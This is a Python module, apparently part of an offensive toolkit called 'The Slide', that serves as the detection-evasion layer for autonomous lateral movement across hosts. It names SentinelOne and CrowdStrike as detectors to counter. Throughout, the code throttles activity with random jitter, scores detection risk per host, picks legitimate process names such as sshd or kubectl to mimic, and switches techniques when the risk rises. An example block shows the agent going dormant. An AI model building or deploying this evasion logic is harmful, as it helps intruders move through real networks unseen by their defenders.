# sovereign_movement/slide/behavioral_camouflage.py
"""
BehavioralCamouflage — The Slide's Low-Observable Layer

Purpose:
- Keep The Slide under modern behavioral EDR/XDR and UEBA detection thresholds.
- Blend movement into normal host behavior (living-off-the-land style).
- Dynamically throttle activity and switch techniques when risk rises.
- Integrate with FrameEnergy so The Slide only moves when both frame_energy
  AND behavioral cost are acceptable.

This module helps counter:
- SentinelOne Storyline correlation
- CrowdStrike behavioral AI
- UEBA risk scoring + automated quarantine
"""

from __future__ import annotations
from dataclasses import dataclass
from typing import Optional, Dict, Any
import time
import logging
import random

from sovereign_engine.frame_energy import FrameEnergy, EraFrameId

logger = logging.getLogger("sovereign.slide.camouflage")


@dataclass
class BehavioralProfile:
    """Tracks behavioral state of The Slide on the current host."""
    host: str
    movement_count: int = 0
    last_action_time: float = 0.0
    current_risk_score: float = 0.0
    consecutive_failures: int = 0
    last_technique: str = "none"


class BehavioralCamouflage:
    """
    Behavioral camouflage and risk management for The Slide.

    Designed to keep autonomous lateral movement below modern
    behavioral detection thresholds while still progressing.
    """

    def __init__(
        self,
        frame_energy: FrameEnergy,
        max_risk_score: float = 65.0,
        base_throttle_seconds: float = 45.0,
    ):
        self.frame_energy = frame_energy
        self.max_risk_score = max_risk_score
        self.base_throttle_seconds = base_throttle_seconds
        self.profile: Optional[BehavioralProfile] = None

    def initialize_profile(self, host: str):
        """Start tracking behavior on a new host."""
        self.profile = BehavioralProfile(host=host)
        logger.debug(f"[Camouflage] Initialized behavioral profile on {host}")

    # ============================================================
    # Core Decision Methods
    # ============================================================

    def should_proceed(self, current_frame: EraFrameId) -> bool:
        """
        Decide whether The Slide should continue movement right now.
        Combines Frame Energy + Behavioral Risk.
        """
        if not self.profile:
            return True

        frame_cost = self.frame_energy.compute(
            current_frame,
            self.frame_energy.floor_anchor,
            # Simplified projected state
            type("obj", (object,), {
                "frame": current_frame,
                "projected_coords": [],
                "coherence": 0.9,
                "gradient_norm": 0.1
            })()
        )

        total_cost = frame_cost + (self.profile.current_risk_score * 0.3)

        if total_cost > self.max_risk_score:
            logger.warning(
                f"[Camouflage] High combined cost ({total_cost:.1f}). "
                f"Pausing movement on {self.profile.host}"
            )
            return False

        return True

    def apply_camouflage(self, technique: str = "default") -> float:
        """
        Apply behavioral camouflage before taking an action.
        Returns the number of seconds The Slide should wait.
        """
        if not self.profile:
            return 0.0

        # Base throttle + random jitter (makes behavior less predictable)
        wait_time = self.base_throttle_seconds + random.uniform(-15, 25)

        # Increase throttle after failures or high activity
        if self.profile.consecutive_failures > 1:
            wait_time *= 1.8
        if self.profile.movement_count > 4:
            wait_time *= 1.4

        # Technique-specific adjustments
        if technique == "aggressive":
            wait_time *= 0.6
        elif technique == "stealth":
            wait_time *= 1.6

        self.profile.last_technique = technique
        self.profile.last_action_time = time.time()

        logger.debug(
            f"[Camouflage] Applying {technique} camouflage. "
            f"Waiting {wait_time:.1f}s"
        )
        return max(5.0, wait_time)

    def record_action(self, success: bool, risk_delta: float = 0.0):
        """Update behavioral profile after an action."""
        if not self.profile:
            return

        self.profile.movement_count += 1

        if success:
            self.profile.consecutive_failures = 0
            self.profile.current_risk_score = max(
                0.0, self.profile.current_risk_score - 8
            )
        else:
            self.profile.consecutive_failures += 1
            self.profile.current_risk_score += 18 + risk_delta

        # Cap risk score
        self.profile.current_risk_score = min(
            self.profile.current_risk_score, 100.0
        )

        logger.debug(
            f"[Camouflage] Risk score updated to {self.profile.current_risk_score:.1f} "
            f"(failures: {self.profile.consecutive_failures})"
        )

    def get_mimic_process(self) -> str:
        """
        Return a process name The Slide should try to blend in with.
        This helps evade behavioral correlation.
        """
        common_processes = [
            "ansible-playbook",
            "kubectl",
            "terraform",
            "systemd",
            "sshd",
            "python3",
            "node",
        ]
        return random.choice(common_processes)

    def should_change_technique(self) -> bool:
        """Decide if The Slide should switch techniques to reduce detection risk."""
        if not self.profile:
            return False

        return (
            self.profile.consecutive_failures >= 2
            or self.profile.current_risk_score > 55
        )

    def get_status(self) -> Dict[str, Any]:
        if not self.profile:
            return {"status": "not_initialized"}

        return {
            "host": self.profile.host,
            "risk_score": round(self.profile.current_risk_score, 1),
            "movements": self.profile.movement_count,
            "consecutive_failures": self.profile.consecutive_failures,
            "last_technique": self.profile.last_technique,
        }


# ============================================================
# Example integration inside SlideAgent
# ============================================================
"""
Example usage pattern:

camouflage = BehavioralCamouflage(frame_energy=frame_energy)

# Before each phase
if not camouflage.should_proceed(current_frame):
    time.sleep(120)  # Go dormant

wait = camouflage.apply_camouflage(technique="stealth")
time.sleep(wait)

# After action
camouflage.record_action(success=True)

if camouflage.should_change_technique():
    # Switch to more passive technique or change frame
    current_frame = EraFrameId.FloorBaseline
"""